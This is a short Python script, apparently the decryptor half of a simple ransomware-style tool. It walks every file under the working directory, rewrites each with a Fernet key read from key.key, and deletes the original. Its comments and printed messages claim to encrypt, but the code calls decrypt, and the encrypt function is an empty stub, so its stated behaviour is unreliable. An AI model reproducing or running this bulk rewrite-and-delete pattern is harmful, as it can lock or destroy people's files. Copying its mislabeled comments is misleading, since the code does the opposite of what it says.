from cryptography.fernet import Fernet
import glob
import os

currentdirectory = os.getcwd()   # Get current directory (don't want to encrypt system files)

def load_key():   #loads the encryption key
    return open("key.key", "rb").read()

def encrypt(filename, key):  #encrypts all files, here key represents bytes
    f = Fernet(key)


key = load_key()  # initialize the Fernet class

f = Fernet(key)   #file_list = os.listdir(currentdirectory)

print('\n Beginning recursive encryption...\n\n')

for x in glob.glob(currentdirectory +'/**/*/*', recursive=True):    # Main loop to encrypt all files recursively
# double asterix ** tells program to encrypt all types of files

    fullpath = os.path.join(currentdirectory, x)
    fullnewf = os.path.join(currentdirectory, os.path.splitext(x)[0])
    # Encrypt
    if os.path.isfile(fullpath):   #make sure it is a file, otherwise if it is folder it will give error
        print('>>> Original: \t' + fullpath + '')
        print('>>> Encrypted: \t' + fullnewf + '\n')
        with open(fullpath, "rb") as file:             # read all file data
            file_data = file.read()
       
        decrypted_data = f.decrypt(file_data)  # encrypt data

        with open(fullnewf, "wb") as file:  # write the encrypted file
            file.write(decrypted_data)

        os.remove(fullpath)  #removes the old file
